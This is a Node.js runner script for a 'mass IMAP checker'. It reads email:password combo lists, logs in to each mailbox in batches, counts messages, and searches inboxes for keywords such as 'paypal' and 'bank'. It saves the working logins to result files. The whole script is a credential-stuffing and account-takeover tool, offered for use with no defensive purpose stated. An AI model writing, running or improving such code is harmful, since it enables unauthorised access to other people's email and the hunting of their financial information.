const MassImapChecker = require('./mass-checker');
const path = require('path');

/**
 * Professional Mass IMAP Checker Runner
 * Usage: node run-mass-checker.js [keyword]
 */
async function main() {
    try {
        // Get keyword from command line argument
        const keyword = process.argv[2] || null;
        
        // Configuration
        const config = {
            comboFile: path.join(__dirname, 'combos.txt'),
            concurrent: 3,
            delay: 2000,
            keyword: keyword
        };
        
        console.log('🚀 PROFESSIONAL MASS IMAP CHECKER');
        console.log('='.repeat(50));
        console.log(`📁 Combo file: ${config.comboFile}`);
        console.log(`⚙️  Concurrent processing: ${config.concurrent} accounts`);
        console.log(`⏱️  Delay between batches: ${config.delay}ms`);
        
        if (config.keyword) {
            console.log(`� Search keyword: "${config.keyword}"`);
            console.log(`📧 Mode: Login + Inbox Count + Keyword Search`);
        } else {
            console.log(`📧 Mode: Login + Inbox Count Only`);
            console.log(`💡 Tip: Add keyword: node run-mass-checker.js paypal`);
        }
        
        console.log('='.repeat(50));
        console.log('');
        
        // Initialize mass checker
        const checker = new MassImapChecker();
        
        // Load email combinations
        const combos = checker.loadCombos(config.comboFile);
        
        if (combos.length === 0) {
            console.log('❌ No valid email combinations found!');
            console.log('� Please create combos.txt with format: email:password');
            return;
        }
        
        // Start mass checking
        await checker.checkAllAccounts(combos, {
            concurrent: config.concurrent,
            delay: config.delay,
            keyword: config.keyword
        });
        
        console.log('\n✅ Mass checking completed successfully!');
        console.log('� Results saved in examples/results/ directory');
        
    } catch (error) {
        console.error('❌ Fatal error:', error.message);
        process.exit(1);
    }
}

// Handle process interruption
process.on('SIGINT', () => {
    console.log('\n\n⚠️  Process interrupted by user');
    console.log('� Partial results may be available in results/ directory');
    process.exit(0);
});

// Handle unhandled errors
process.on('unhandledRejection', (error) => {
    console.error('\n� Unhandled error:', error.message);
    process.exit(1);
});

// Run main function if called directly
if (require.main === module) {
    main();
}

module.exports = { main };

/*
=== USAGE EXAMPLES ===

1. Basic checking (login + inbox count):
   node run-mass-checker.js

2. With keyword search:
   node run-mass-checker.js paypal
   node run-mass-checker.js invoice
   node run-mass-checker.js bank

=== COMBO FILE FORMAT ===
Create combos.txt with one email:password per line:
email1@domain.com:password1
email2@domain.com:password2

=== OUTPUT FILES ===
- valid-accounts-TIMESTAMP.txt (email:pass format)
- invalid-accounts-TIMESTAMP.txt (email:pass # error)
- summary-TIMESTAMP.txt (detailed report)
*/
